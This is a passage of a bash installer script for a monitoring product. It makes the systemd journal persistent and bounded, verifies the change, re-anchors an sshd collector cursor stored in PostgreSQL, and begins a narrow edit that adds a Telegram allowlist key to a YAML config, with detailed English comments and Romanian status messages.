MACHINE_ID_PATH="${MACHINE_ID_PATH:-/etc/machine-id}"

# THE NUMBERS, AND WHAT THEY WERE CHOSEN AGAINST
#
# Measured on 10 September 2026, both hosts:
#
#   * n8n keeps exactly 7 days (`MaxRetentionSec=7day`; its own journal says
#     "Retention time reached, rotating") in 367.5 M -> 52.5 MB/day ON DISK,
#     with `Compress=yes`, out of 45 321 entries and 46.95 MB of `-o export`
#     bytes per day. On-disk is therefore 1.12x the export bytes: at this scale
#     journald's 8 M preallocated files and hash tables cost more than
#     compression saves. That ratio is the one number here measured on a
#     PERSISTENT, compressing journal — the case being configured.
#   * production writes 3.72 MB/h of export bytes (4 076 entries/h), i.e.
#     ~89 MB/day, so ~100 MB/day on disk by that ratio. That hour was the first
#     after a boot and is the noisy end; the longer window — 149.1 M retained
#     over 2.79 days at the /run cap — puts the steady state nearer 55 MB/day.
#     100 MB/day is used below because it is the conservative one, and it is an
#     EXTRAPOLATION, not a measurement: nobody can measure the on-disk rate of a
#     journal that has never been on disk.
#
# SystemMaxUse=2G is then 20 days at the conservative rate and ~35 at the
# observed one; 2.4 % of the 83 G free on production's `/`, 1 % of the
# filesystem. MaxRetentionSec=30day is the other end: on a quiet host the time
# bound binds first and the journal never reaches 2 G at all. Both are needed
# and neither is decoration — an unbounded journal on a box that also runs the
# PostgreSQL this product keeps everything in is a way to take the database
# down, and a size-only bound on a quiet host keeps years of nothing.
#
# MaxFileSec=1day is what makes the time bound work at all: `MaxRetentionSec`
# deletes whole FILES whose newest entry is older than the limit, so without a
# rotation cadence a single file spanning the entire window never expires.
# SystemMaxFileSize=128M gives 16 files at the cap instead of journald's default
# 8 (SystemMaxUse/8), so vacuuming drops ~6 % of the history at a time, not 12 %.
#
# SystemKeepFree is deliberately NOT set. Its default — 15 % of the filesystem —
# is what actually protects PostgreSQL from a journal that misbehaves, and any
# value written here would be smaller than that on this host.
JOURNAL_MAX_USE="${JOURNAL_MAX_USE:-2G}"
JOURNAL_MAX_USE_BYTES="${JOURNAL_MAX_USE_BYTES:-2147483648}"
JOURNAL_MAX_FILE_SIZE="${JOURNAL_MAX_FILE_SIZE:-128M}"
JOURNAL_MAX_FILE_SEC="${JOURNAL_MAX_FILE_SEC:-1day}"
JOURNAL_RETENTION="${JOURNAL_RETENTION:-30day}"

# Bound keys an operator may have set for themselves. If ANY of them is set
# outside our own drop-in, this step writes no numbers at all — see
# `journal_operator_bounds`.
JOURNAL_BOUND_KEYS="SystemMaxUse SystemKeepFree SystemMaxFileSize MaxRetentionSec MaxFileSec"

# How long systemd-journald has to stay up after the restart before it counts as
# started. See `journald_restart_and_settle` for why one `is-active` is not an
# answer.
JOURNALD_SETTLE_S="${JOURNALD_SETTLE_S:-5}"

journal_machine_id() {
    local mid=""
    if [[ -r "$MACHINE_ID_PATH" ]]; then
        mid="$(tr -dc '0-9a-f' < "$MACHINE_ID_PATH")" || mid=""
    fi
    [[ -n "$mid" ]] || return 1
    printf '%s' "$mid"
}

# Where journald is writing RIGHT NOW, asked of journald.
#
# `journalctl --header` prints, per file, the path and the file's State. ONLINE
# means the daemon currently holds that file open for writing, and that is the
# observable which means "storage is persistent". A directory existing on disk
# is not: /var/log/journal can be created by hand and journald will keep writing
# to /run until it is restarted or flushed — the "a file on disk is not proof it
# was loaded" row of CLAUDE.md's table.
#
# Three answers, never two:
#
#   persistent  an ONLINE file under $JOURNAL_DIR/<machine-id>/
#   runtime     an ONLINE file under $JOURNAL_RUNTIME_DIR/<machine-id>/
#   unknown     the machine id is unreadable, journalctl said nothing, or no
#               file is ONLINE anywhere. NOT "runtime": acting on "I could not
#               look" is how this step would come to restart systemd-journald on
#               a host that was already right.
journal_storage_state() {
    local mid headers online
    mid="$(journal_machine_id)" || { printf 'unknown'; return 0; }
    headers="$(journalctl --header 2>/dev/null)" || headers=""
    if [[ -z "$headers" ]]; then
        printf 'unknown'
        return 0
    fi
    online="$(printf '%s\n' "$headers" \
        | awk '/^File path:/ { p = $3 } /^State:/ { if ($2 == "ONLINE") print p }')"
    if printf '%s\n' "$online" | grep -q "^${JOURNAL_DIR}/${mid}/"; then
        printf 'persistent'
    elif printf '%s\n' "$online" | grep -q "^${JOURNAL_RUNTIME_DIR}/${mid}/"; then
        printf 'runtime'
    else
        printf 'unknown'
    fi
}

# journald's OWN report of the size cap it is enforcing, in bytes; empty when it
# has not said.
#
# The source is systemd's SD_MESSAGE_JOURNAL_USAGE — the "System Journal (…) is
# X, max Y" line — which carries MAX_USE, JOURNAL_NAME and JOURNAL_PATH as
# STRUCTURED fields beside the human sentence. So this is the daemon reporting
# what it DECIDED, rather than this script re-reading the file it has just
# written, and it is not a grep over free text either.
#
# Selected by UNIT and not by that message's id: the id is an unbroken 32-hex
# constant, and this repository's secret guard refuses runs of that shape in
# shipped files — correctly, and it is not worth a named exemption when the
# same entries are reachable without one. Measured: `-u systemd-journald`
# scans 9 entries on production and 10 on the Ubuntu host, and the awk below
# keeps only the System Journal ones, which no other message carries.
#
# Empty is reachable on a host whose uptime exceeds its own retention, since the
# message is written when a journal is opened and can be vacuumed away later.
# Empty is "I could not look", and the callers say so — except right after this
# step restarts the daemon, where the message is seconds old and its absence
# means the configuration was never read.
journal_effective_max_use() {
    journalctl -b -u systemd-journald -o export \
        --output-fields=JOURNAL_NAME,JOURNAL_PATH,MAX_USE 2>/dev/null \
    | awk '
        function take() {
            if (name == "System Journal" && max != "") last = max
            name = ""; max = ""
        }
        /^JOURNAL_NAME=/ { name = substr($0, 14); next }
        /^MAX_USE=/      { max  = substr($0, 9);  next }
        /^$/             { take(); next }
        END { take(); if (last != "") print last }' || true
}

# Bound settings an operator has written for themselves, one "file: KEY=value"
# per line; empty when there are none.
#
# Our own drop-in is excluded, so this answers "did somebody else already decide
# these numbers", not "did we". When it answers yes, this step writes no numbers
# at all — a tuned journald.conf is a coherent whole, and half of it replaced by
# ours is a configuration nobody designed. Same principle as `install_config`.
journal_operator_bounds() {
    local f key
    for f in "$JOURNALD_CONF" "$JOURNALD_CONF_DIR"/*.conf \
             /run/systemd/journald.conf.d/*.conf \
             /usr/lib/systemd/journald.conf.d/*.conf; do
        if [[ -f "$f" && "$f" != "$JOURNALD_DROPIN" ]]; then
            for key in $JOURNAL_BOUND_KEYS; do
                # `[^[:space:]]` after the `=`: a key with nothing after it means
                # "use the default" and is not a bound. Production's journald.conf
                # has exactly one uncommented line and it is of that shape
                # (`Audit=`).
                grep -hE "^[[:space:]]*${key}[[:space:]]*=[[:space:]]*[^[:space:]]" "$f" \
                    2>/dev/null | sed "s|^|${f}: |" || true
            done
        fi
    done
}

# Has somebody asked for a volatile journal on purpose? Prints the file saying so.
#
# An installer that quietly overrides a deliberate choice does it again at every
# deploy, and the operator never finds out why their setting keeps losing.
journal_storage_forced_volatile() {
    local f
    for f in "$JOURNALD_CONF" "$JOURNALD_CONF_DIR"/*.conf; do
        if [[ -f "$f" && "$f" != "$JOURNALD_DROPIN" ]]; then
            if grep -qE '^[[:space:]]*Storage[[:space:]]*=[[:space:]]*(volatile|none)' "$f"; then
                printf '%s' "$f"
                return 0
            fi
        fi
    done
    return 1
}

# The drop-in's own text is ASCII, alone in this file: it is parsed by a daemon
# at boot on hosts whose locale nobody here chose, and a journal that will not
# start is the one failure this step must not be able to cause. The reasoning
# lives in the comments above, in the repository, where it can be read.
journal_dropin_body() {
    local with_bounds="$1"
    cat <<EOF
# Scris de instalatorul Sentinel (pasul 41). Nu edita aici: fisierul e rescris
# din depozit la fiecare deploy.
#
# Ca sa pui praguri proprii, scrie-le in ${JOURNALD_CONF} sau intr-un drop-in
# separat. Instalatorul le vede si atunci nu mai scrie niciun prag aici, doar
# linia Storage.
#
# De ce persistent: pe RHEL si derivate implicitul e jurnal in /run, deci
# fiecare repornire sterge toate dovezile de autentificare. Pe 10 septembrie
# 2026 productia a pierdut asa patru zile de sshd.
[Journal]
Storage=persistent
EOF
    if [[ "$with_bounds" == "yes" ]]; then
        cat <<EOF
# Marginit pe AMANDOUA axele: marimea apara partitia pe care sta PostgreSQL,
# timpul tine fereastra de dovezi previzibila pe o gazda tacuta. MaxFileSec e
# ce face pragul de timp sa functioneze: retentia sterge FISIERE intregi, deci
# fara rotire zilnica un fisier care acopera toata fereastra nu expira niciodata.
Compress=yes
SystemMaxUse=${JOURNAL_MAX_USE}
SystemMaxFileSize=${JOURNAL_MAX_FILE_SIZE}
MaxFileSec=${JOURNAL_MAX_FILE_SEC}
MaxRetentionSec=${JOURNAL_RETENTION}
EOF
    fi
}

# Writes the drop-in only when its content would change. Returns 0 when it wrote
# something, 1 when the file was already exactly this.
#
# Overwritten rather than given the `install_config` treatment (a `.new`
# alongside) on purpose: this file is ours, named ours, and carries repo
# content. The operator's file is $JOURNALD_CONF, and `journal_operator_bounds`
# is what keeps this one out of its way.
journal_write_dropin() {
    local body="$1" current="" tmp
    if [[ -f "$JOURNALD_DROPIN" ]]; then
        current="$(cat "$JOURNALD_DROPIN")" || current=""
    fi
    # String comparison, NOT `cmp`: diffutils is not on a minimal RHEL image and
    # `cmp: command not found` made this report "changed" every single time —
    # measured on a fresh AlmaLinux 9, where the second run rewrote a file that
    # was already byte-identical and warned the operator about it. Both sides
    # have had their trailing newlines stripped by `$( )`, so they compare on
    # the same footing.
    if [[ "$current" == "$body" ]]; then
        return 1
    fi
    tmp="$(mktemp)"
    printf '%s\n' "$body" > "$tmp"
    install -D -m 0644 -o root -g root "$tmp" "$JOURNALD_DROPIN"
    rm -f "$tmp"
    return 0
}

journald_restarts() {
    systemctl show systemd-journald -p NRestarts --value 2>/dev/null | tr -dc '0-9' || true
}

# Restart systemd-journald and prove it stayed up.
#
# A unit read as `active` once is not proof it is running: systemd-journald has
# Restart=always, so a daemon dying on a configuration it cannot parse passes
# through `active` on every lap of the loop. That is the "is-active checked
# once" row of CLAUDE.md's table, and it is why this waits and then asks a
# second, different question.
#
# NRestarts counts AUTOMATIC restarts, but an explicit `systemctl restart` —
# ours, right above — does NOT leave it unchanged: it RESETS the counter to 0,
# because systemd flushes n_restarts on the next non-automatic start. Measured
# with a throwaway transient unit on systemd 255; NOT measured on production's
# systemd-252-67.el9_8.6, so the reset there is relied on, not proven — but it
# is the reading that matches the incident that put this step here: journald
# was restarted by `dnf update` on 25 September 2026 and reads NRestarts=0
# right now, not "unchanged from before the update". So "before == after" was
# never the right question — a healthy host whose journald auto-restarted
# earlier this boot has before > 0 and after == 0, and that FAILED the old
# assertion. What has to hold after OUR restart and the settle window is
# `after == 0`: anything else is an automatic restart that happened on our
# watch, i.e. a live crash loop, regardless of what `before` was.
journald_restart_and_settle() {
    local before after waited=0
    before="$(journald_restarts)"
    systemctl restart systemd-journald || return 1
    while (( waited < JOURNALD_SETTLE_S )); do
        systemctl is-active --quiet systemd-journald || return 1
        sleep 1
        waited=$((waited + 1))
    done
    systemctl is-active --quiet systemd-journald || return 1
    after="$(journald_restarts)"
    if [[ -z "$before" || -z "$after" ]]; then
        warn "systemd nu raportează NRestarts pentru systemd-journald, deci nu pot \
spune dacă a repornit singur în cele ${JOURNALD_SETTLE_S}s de așteptare. Rămâne \
neverificat, nu în regulă: journalctl -u systemd-journald -n 50"
        return 0
    fi
    (( after == 0 )) || return 1
    return 0
}

# The cursor journald hands back for the first entry at or after `$1`.
#
# `journalctl --cursor` positions AS CLOSE AS IT CAN and reads forward; it does
# not fail on a cursor the journal no longer holds. So the only proof that a
# stored position still exists is an entry carrying that very `__CURSOR`,
# compared as a string — the same test `_journal_first_unread` makes in
# sentinel/selfcheck/checks.py, on purpose, so the two cannot come to disagree
# about what "the cursor is still there" means.
#
# `-n 1` is NOT usable here, and that is not a style preference: with
# `--cursor … -n 1` journalctl prints the LAST entry of the journal and ignores
# the cursor entirely. Measured — a cursor with a deliberately corrupted seqnum
# id came back matching itself, i.e. that form of the probe would have reported
# every cursor as valid, forever.
journal_cursor_at() {
    local out
    out="$(journalctl --cursor "$1" -o export --output-fields=MESSAGE 2>/dev/null \
           | grep -a -m1 '^__CURSOR=' || true)"
    printf '%s' "${out#__CURSOR=}"
}

# Is this the shape of a journald cursor — six hex fields, named and in order?
#
# Checked byte by byte, NOT with `[[ =~ ]]`, and that is the whole point: bash's
# bracket expressions follow the locale, so `[0-9a-f]` under a UTF-8 locale
# matches fullwidth and Arabic-Indic digits as well. This repository has paid
# for that hole once already. `tr -dc` filters BYTES, so "what survives the
# filter is exactly what went in" is a whitelist in ANY locale — and, unlike a
# regex with `LC_ALL=C` in front of it, it is a property a test can actually
# exercise on a development machine. That matters more than it sounds: the
# LC_ALL=C version of this function was written first, and no test on this
# machine could be made to see it removed. A defence nobody can watch disappear
# is not a defence.
#
# `set -f` in the subshell: the split below is deliberately unquoted, so without
# it a cursor carrying a glob character would be expanded against the filesystem.
journal_cursor_is_wellformed() {
    (
        set -f
        local cursor="$1" part key val n=0
        for part in ${cursor//;/ }; do
            n=$((n + 1))
            [[ "$part" == *=* ]] || exit 1
            key="${part%%=*}"
            val="${part#*=}"
            [[ -n "$val" && "$val" == "$(printf '%s' "$val" | tr -dc '0-9a-f')" ]] || exit 1
            case "${n}:${key}" in
                1:s|2:i|3:b|4:m|5:t|6:x) ;;
                *) exit 1 ;;
            esac
        done
        (( n == 6 ))
    )
}

# Everything after the seqnum id: the ENTRY's own identity — its sequence
# number, boot id, monotonic and realtime timestamps, and the xor hash of its
# fields. Two cursors with the same tail name the same entry.
journal_cursor_identity() { printf '%s' "${1#*;}"; }

journal_db_port() { pg_configured_port "$(pg_confdir)"; }

sshd_cursor_stored() {
    sudo -u postgres psql -p "$1" -d sentinel -tAc \
        "SELECT cursor FROM collector_cursors WHERE name = 'sshd'" 2>/dev/null \
        | tr -d '[:space:]' || true
}

# Moves the stored position to a cursor of the SAME entry. Prints "1" when a row
# was updated.
#
# `WHERE … AND cursor = :'old'` is not belt and braces: sentinel-ingest is
# running while this happens and writes the cursor of every entry it reads. If
# it moved on by itself between the read and this write, its value is a fresh
# valid one, and this must not put an older position back over it. The update
# then affects no rows, which is the correct outcome and is reported as such.
#
# Wrapped in a SELECT because a bare `UPDATE … RETURNING 1` under `psql -tA`
# prints TWO things — the returned row and the command tag — so the output was
# "1UPDATE1" after whitespace was stripped, never "1". Measured on AlmaLinux 9:
# the re-anchor did rewrite the row and then told the operator it had not.
# `count(*)` over the update's own rows is one line, "0" or "1", and cannot be
# read two ways.
#
# stderr is NOT discarded. A failing UPDATE here leaves the collector's position
# unreadable to the selfcheck, and PostgreSQL's own words are the whole
# diagnostic.
sshd_cursor_reanchor() {
    local port="$1" old="$2" new="$3" old_e new_e
    old_e="$(pg_psql_set_escape "$old")"
    new_e="$(pg_psql_set_escape "$new")"
    sudo -u postgres psql -p "$port" -d sentinel -tA -v ON_ERROR_STOP=1 <<SQL | tr -d '[:space:]'
\set old '${old_e}'
\set new '${new_e}'
WITH moved AS (
  UPDATE collector_cursors SET cursor = :'new', updated_at = now()
   WHERE name = 'sshd' AND cursor = :'old' RETURNING 1
) SELECT count(*)::text FROM moved;
SQL
}

# THE FLUSH MOVES EVERY CURSOR. Measured, not read out of a manual.
#
# On AlmaLinux 9.8 / systemd 252-67.el9_8.4.alma.1 — production's exact build —
# a first-ever `journalctl --flush` rewrites the seqnum id of every entry it
# copies:
#
#   before  s=795f11d7…;i=2bf;b=…;m=…;t=…;x=…
#   after   s=7b34064c…;i=2bf;b=…;m=…;t=…;x=…
#
# Only `s=` changes; `i=`, `b=`, `m=`, `t=` and `x=` are byte-identical, because
# they are the same entries — re-filed under the new system journal's own
# sequence id. `_journal_first_unread` in sentinel/selfcheck/checks.py compares
# the stored cursor as a STRING, so without this the very next selfcheck run
# would find `collector_cursors.sshd` missing from the journal, report
# `state=gone` -> `down`, and this step would manufacture on every install
# exactly the false critical that three rounds of work have just removed.
#
# The repair is exact rather than approximate: a new cursor is accepted only
# when its ENTRY IDENTITY is identical to the stored one, i.e. it names the same
# entry. Anything else — the position genuinely gone, the journal rotated under
# a stopped collector, a malformed value in the row — is left alone and said out
# loud. Moving a cursor forward over entries nobody has read is a hole in the
# record, and it would be a silent one.
journal_reanchor_sshd_cursor() {
    local port old new
    if ! have psql; then
        warn "psql lipsește, deci nu pot verifica poziția colectorului sshd după \
flush. Dacă gazda are baza Sentinel, verific-o manual — vezi docs/OPERARE.md §9"
        return 0
    fi
    port="$(journal_db_port)"
    old="$(sshd_cursor_stored "$port")"
    if [[ -z "$old" ]]; then
        info "nu există (încă) o poziție sshd în collector_cursors — nimic de mutat"
        return 0
    fi
    if ! journal_cursor_is_wellformed "$old"; then
        warn "poziția sshd din collector_cursors nu are forma unui cursor journald \
și nu o ating. Autoverificarea o va raporta: journalctl -u sentinel-ingest -n 100"
        return 0
    fi
    new="$(journal_cursor_at "$old")"
    if [[ "$new" == "$old" ]]; then
        ok "poziția colectorului sshd a supraviețuit flush-ului neschimbată"
        return 0
    fi
    if [[ -z "$new" ]] \
       || [[ "$(journal_cursor_identity "$new")" != "$(journal_cursor_identity "$old")" ]]; then
        warn "poziția colectorului sshd nu mai e în jurnal, iar ce urmează după ea e \
ALTĂ intrare — nu o mut, fiindcă aș sări peste intrări pe care nu le-a citit \
nimeni. Autoverificarea o raportează ca și-a pierdut poziția: \
systemctl restart sentinel-ingest ; journalctl -u sentinel-ingest -n 100"
        return 0
    fi
    if [[ "$(sshd_cursor_reanchor "$port" "$old" "$new")" == "1" ]]; then
        ok "poziția colectorului sshd a fost re-ancorată pe ACEEAȘI intrare după \
flush (s-a schimbat doar identificatorul de secvență al jurnalului)"
    else
        info "poziția sshd nu a fost rescrisă: colectorul a avansat-o singur între \
citire și scriere, deci valoarea din bază e deja una proaspătă"
    fi
}

# SELinux labelling for $1. Never fatal on its own — the persistence check is
# what decides, and a mislabelled directory under enforcing shows up there as a
# journald that did not move.
journal_selinux_label() {
    local dir="$1" want got
    have selinuxenabled || return 0
    if ! selinuxenabled; then
        # Production is here: AlmaLinux 9 with SELinux Disabled (measured).
        # `restorecon` refuses to run with the policy off, so the directory
        # simply carries no label yet. That is neither a failure nor "fine", and
        # it is said rather than skipped in silence.
        info "SELinux e dezactivat: ${dir} nu primește etichetă acum. La repornirea \
SELinux o pune relabelarea de la boot, ori restorecon -RF ${dir} manual"
        return 0
    fi
    if ! have restorecon; then
        warn "SELinux e activ dar restorecon lipsește; ${dir} rămâne cu eticheta \
moștenită de la /var/log — verific-o cu: ls -Zd ${dir}"
        return 0
    fi
    restorecon -RF "$dir" || warn "restorecon a eșuat pe ${dir}"
    # Verified, not assumed: what the FILESYSTEM carries against what the POLICY
    # asks for. `restorecon`'s exit code says a call was made, not that the label
    # is right.
    got="$(stat -c %C "$dir" 2>/dev/null || true)"
    if have matchpathcon; then
        want="$(matchpathcon -n "$dir" 2>/dev/null | tr -d '[:space:]' || true)"
    else
        want=""
    fi
    if [[ -n "$want" && -n "$got" && "$got" != "$want" ]]; then
        warn "eticheta SELinux a lui ${dir} e ${got}, dar politica cere ${want}"
    else
        ok "SELinux: ${dir} poartă eticheta ${got:-necunoscută}"
    fi
}

# Ownership and mode, checked and never widened.
#
# 2755 root:systemd-journal is systemd's own tmpfiles definition for this
# directory, and the setgid bit is what makes the per-machine subdirectory
# journald creates inside it group-owned by systemd-journal — which is how the
# `sentinel` user reads the journal at all (step 19 puts it in that group). An
# existing directory is NOT chmodded to match: an operator who tightened it gets
# a warning, not a silent widening.
journal_check_dir_mode() {
    local dir="$1" mode owner
    mode="$(stat -c %a "$dir" 2>/dev/null || true)"
    owner="$(stat -c %U:%G "$dir" 2>/dev/null || true)"
    if [[ -z "$mode" || -z "$owner" ]]; then
        warn "nu pot citi drepturile lui ${dir} — neverificat"
        return 0
    fi
    if [[ "$mode" == "2755" && "$owner" == "root:systemd-journal" ]]; then
        ok "${dir} e ${mode} ${owner}"
    else
        warn "${dir} e ${mode} ${owner}, nu 2755 root:systemd-journal. Nu îl schimb \
(o restrângere făcută de tine nu se desface de aici), dar dacă utilizatorul \
sentinel nu mai citește jurnalul, ăsta e motivul"
    fi
}

# Does the host now DEMONSTRATE persistence? Ends the run when it does not.
#
# Five separate facts, because each one alone has a way of being true while the
# thing it stands for is false:
#
#   * journald reports an ONLINE file under $JOURNAL_DIR — the daemon is writing
#     there, as opposed to a directory somebody created;
#   * journal files exist in it;
#   * `journalctl -D` reads history out of that directory ALONE, so the answer
#     cannot be coming from /run;
#   * nothing is left in the runtime directory, which is what makes the three
#     above evidence rather than coincidence;
#   * journald's own MAX_USE is no larger than what was asked for.
journal_verify_persistent() {
    local mid="$1" with_bounds="$2" state max_use digits f files=0
    state="$(journal_storage_state)"
    [[ "$state" == "persistent" ]] || die "journald tot nu scrie în ${JOURNAL_DIR}: \
starea măsurată după repornire și flush e \"${state}\". Jurnalul rămâne volatil, \
deci dovezile de autentificare tot dispar la repornire. Vezi: \
journalctl --header | head -20 ; systemctl status systemd-journald"

    for f in "${JOURNAL_DIR}/${mid}"/*.journal; do
        if [[ -f "$f" ]]; then
            files=$((files + 1))
        fi
    done
    (( files > 0 )) || die "nu există niciun fișier de jurnal în ${JOURNAL_DIR}/${mid}/ \
după flush — directorul e gol, deci nu s-a mutat nimic acolo"

    [[ -n "$(journalctl -D "$JOURNAL_DIR" -n 1 -o cat 2>/dev/null)" ]] || die \
"journalctl nu citește nicio intrare din ${JOURNAL_DIR} singur — fișierele sunt \
acolo, dar nu conțin un jurnal lizibil"

    for f in "${JOURNAL_RUNTIME_DIR}/${mid}"/*.journal; do
        if [[ -f "$f" ]]; then
            die "flush-ul nu a golit ${JOURNAL_RUNTIME_DIR}/${mid}/ — au rămas fișiere \
acolo, deci o parte din istoric e tot volatilă"
        fi
    done

    max_use="$(journal_effective_max_use)"
    digits="$(printf '%s' "$max_use" | tr -dc '0-9')"
    # Compared as strings, not with `[[ =~ ]]`: `[0-9]` is not ASCII under a
    # UTF-8 locale, and an error inside `(( ))` returns 1 — which reads as
    # "false" and would let a non-numeric value through the bound check below.
    [[ -n "$digits" && "$digits" == "$max_use" ]] || die "journald nu a raportat un \
MAX_USE numeric pentru jurnalul de sistem în boot-ul ăsta (a spus \"${max_use}\"), \
deși tocmai a fost repornit — nu pot dovedi că pragul de mărime e în vigoare, iar \
un jurnal nemărginit pe partiția bazei de date nu e o îmbunătățire"

    if [[ "$with_bounds" == "yes" ]] && (( max_use > JOURNAL_MAX_USE_BYTES )); then
        die "journald aplică un prag de ${max_use} octeți, mai mare decât cei \
${JOURNAL_MAX_USE_BYTES} scriși în ${JOURNALD_DROPIN} — configurația nu a fost \
citită. Vezi: systemd-analyze cat-config systemd/journald.conf"
    fi
    ok "journald raportează pragul efectiv de mărime: ${max_use} octeți"

    # The time bound has NO runtime observable — journald reports its retention
    # nowhere until the day it fires ("Retention time reached, rotating"). So
    # this one is read back from the file and is LABELLED as read from the file,
    # rather than being reported in the same breath as the measured one.
    if [[ "$with_bounds" == "yes" ]]; then
        if grep -qE "^MaxRetentionSec=${JOURNAL_RETENTION}\$" "$JOURNALD_DROPIN"; then
            ok "pragul de timp e scris (MaxRetentionSec=${JOURNAL_RETENTION}) — journald \
nu raportează retenția nicăieri până când chiar șterge, deci ăsta e citit din \
configurație, nu măsurat"
        else
            die "${JOURNALD_DROPIN} nu conține MaxRetentionSec=${JOURNAL_RETENTION} \
după scriere — jurnalul ar fi mărginit doar pe mărime"
        fi
    fi
    return 0
}

step_journal_storage() {
    local mid state operator_bounds with_bounds body volatile_file max_use

    state="$(journal_storage_state)"
    operator_bounds="$(journal_operator_bounds)"
    with_bounds=yes
    if [[ -n "$operator_bounds" ]]; then
        with_bounds=no
    fi
    body="$(journal_dropin_body "$with_bounds")"

    if [[ "$state" == "unknown" ]]; then
        warn "nu pot citi unde scrie journald (journalctl --header nu a răspuns, ori \
niciun fișier nu e ONLINE), deci nu ating nimic. O repornire a lui \
systemd-journald pe o gazdă despre care nu știu nimic e mai rea decât un jurnal \
volatil. Verifică manual: journalctl --header | head -20"
        return 0
    fi

    if [[ "$state" == "persistent" ]]; then
        mid="$(journal_machine_id)" || mid="?"
        ok "jurnalul e deja persistent: journald scrie în ${JOURNAL_DIR}/${mid}/"
        max_use="$(journal_effective_max_use)"
        if [[ -n "$max_use" ]]; then
            info "pragul de mărime raportat de journald: ${max_use} octeți"
        fi
        if [[ -n "$operator_bounds" ]]; then
            ok "praguri puse de tine, lăsate neatinse:"
            printf '%s\n' "$operator_bounds" | sed 's/^/      /'
            return 0
        fi
        # Persistent and unbounded except for journald's built-in 4 G ceiling.
        # The drop-in goes in so the NEXT journald start picks it up, and
        # systemd-journald is deliberately NOT restarted: a restart on a host
        # that already keeps its history is a change nobody asked for, for a cap
        # that is already there. Said out loud instead of applied quietly.
        if journal_write_dropin "$body"; then
            warn "gazda ține jurnalul, dar fără praguri proprii. Am scris \
${JOURNALD_DROPIN} (${JOURNAL_MAX_USE} / ${JOURNAL_RETENTION}) și NU repornesc \
systemd-journald pe o gazdă care e deja în regulă — pragurile intră în vigoare la \
următoarea pornire a lui journald. Ca să le aplici acum: systemctl restart \
systemd-journald"
        else
            ok "${JOURNALD_DROPIN} e deja exact ăsta; nimic de făcut"
        fi
        return 0
    fi

    # state == runtime: this host loses its authentication history at every boot,
    # and that is the whole reason this step exists.
    mid="$(journal_machine_id)" || die "internal: starea jurnalului e \"runtime\", \
dar ${MACHINE_ID_PATH} nu se poate citi"
    info "journald scrie în ${JOURNAL_RUNTIME_DIR}/${mid}/ — jurnalul e volatil și \
dispare la fiecare repornire, cu tot ce știe despre autentificări"

    if volatile_file="$(journal_storage_forced_volatile)"; then
        warn "${volatile_file} cere explicit un jurnal volatil. Nu îl suprascriu — \
scoate linia Storage= de acolo și rulează din nou cu --force-step 41 dacă vrei ca \
jurnalul să supraviețuiască repornirii"
        return 0
    fi

    if [[ ! -d "$JOURNAL_DIR" ]]; then
        install -d -m 2755 -o root -g systemd-journal "$JOURNAL_DIR" \
            || die "nu pot crea ${JOURNAL_DIR}"
        ok "creat ${JOURNAL_DIR}"
    fi
    journal_check_dir_mode "$JOURNAL_DIR"
    journal_selinux_label "$JOURNAL_DIR"

    if journal_write_dropin "$body"; then
        ok "scris ${JOURNALD_DROPIN}"
    else
        info "${JOURNALD_DROPIN} era deja scris"
    fi
    if [[ "$with_bounds" == "no" ]]; then
        warn "pragurile rămân ale tale (${operator_bounds//$'\n'/; }); am scris în \
${JOURNALD_DROPIN} doar Storage=persistent"
    fi

    # journald reads its configuration only at startup — `systemctl show
    # systemd-journald -p CanReload` answers no, measured — so the bounds need
    # the restart. The flush needs it too, in the other direction: journald stays
    # on runtime storage until it is ASKED, whatever the configuration says, and
    # `systemctl start systemd-journal-flush` is not the way to ask. That unit is
    # a oneshot which already ran at boot and is `active (exited)`, so starting it
    # is a no-op returning 0 — measured, and it is what made a first draft of this
    # step report a successful flush that had never happened.
    journald_restart_and_settle \
        || die "systemd-journald nu a rămas pornit după repornire — configurația din \
${JOURNALD_DROPIN} e probabil respinsă. Vezi: journalctl -u systemd-journald -n 50 \
; systemctl status systemd-journald"
    journalctl --flush || die "journalctl --flush a eșuat; jurnalul rămâne în \
${JOURNAL_RUNTIME_DIR}"

    journal_verify_persistent "$mid" "$with_bounds"
    ok "jurnalul supraviețuiește acum repornirii: ${JOURNAL_DIR}/${mid}/"

    journal_reanchor_sshd_cursor
}

# --- 42 ---------------------------------------------------------------
# Closes the exposure CLAUDE.md opens with: on every host installed before
# `telegram.allowed_user_ids` existed, `allowed_chat_ids` names a GROUP and the
# key that would narrow it to specific senders is ABSENT from the file, not
# empty. `_authorized` in sentinel/telegram/bot.py already does the right
# thing the moment the key is there — see its own docstring — so the only gap
# left is that nothing ever puts it there on a host that predates it.
#
# `install_config` (step 26) will never close that gap on its own: it does not
# touch a sentinel.yaml that differs from the template, on purpose — a full
# rewrite on the two hosts this was found on would also flip
# `beacon.enabled`/`ship.enabled` to false and stop the external witness (see
# `install_config`'s own docstring). So this is a SECOND, narrower writer, for
# ONE key, that never touches anything install_config would refuse to touch.
#
# SURGICAL, not a YAML round-trip. `yaml.safe_load` + `yaml.safe_dump` would
# reorder keys, drop every comment that explains them, and possibly requote
# list items — trading "we left your config alone" for "we touched all of
# it, structurally". The functions below find exactly one line inside the
# `telegram:` block (or exactly one place to insert one) and change nothing
# else — see the read-back-and-diff test in
# tests/security/test_telegram_owner_allowlist.py for what "nothing else"
# means in practice.

# Prints the leading whitespace `telegram:`'s children use, measured from the
# sibling `enabled:` line — never hard-coded as two spaces. Every host that
# reaches this step already satisfies "Sentinel refuses to start with
# telegram.enabled and no chat ids" (deploy/config/sentinel.yaml.tmpl), so
# `enabled:` is always there to measure from; a fixed guess would be a SECOND,
# unchecked idea of the file's own formatting, and the two would disagree on
# any sentinel.yaml this installer did not itself template.
telegram_allowed_user_ids_indent() {
    awk '
        /^[^ \t#]/ { in_tg = ($0 ~ /^telegram:[ \t]*$/); next }
        in_tg && match($0, /^[ \t]+enabled:/) {
            print substr($0, 1, RLENGTH - length("enabled:"))
            exit
        }
    ' "$1"
}

# True (exit 0) only when `allowed_user_ids:` is already there with NOTHING
# after the colon on its own line, AND is followed by a block-sequence item
# (`  - …`) at deeper indentation — the one shape this installer and the
# template never write and therefore never learned to rewrite. Returning
# "not ambiguous" (exit 1) is the default for every other case, including
# "key absent", because absence is not this function's question to answer.
telegram_allowed_user_ids_is_block_form() {
    local yaml="$1" indent="$2"
    awk -v indent="$indent" '
        /^[^ \t#]/ { in_tg = ($0 ~ /^telegram:[ \t]*$/); next }
        in_tg && !seen && index($0, indent "allowed_user_ids:") == 1 {
            rest = substr($0, length(indent "allowed_user_ids:") + 1)
            sub(/^[ \t]+/, "", rest); sub(/[ \t]+$/, "", rest)
            seen = 1
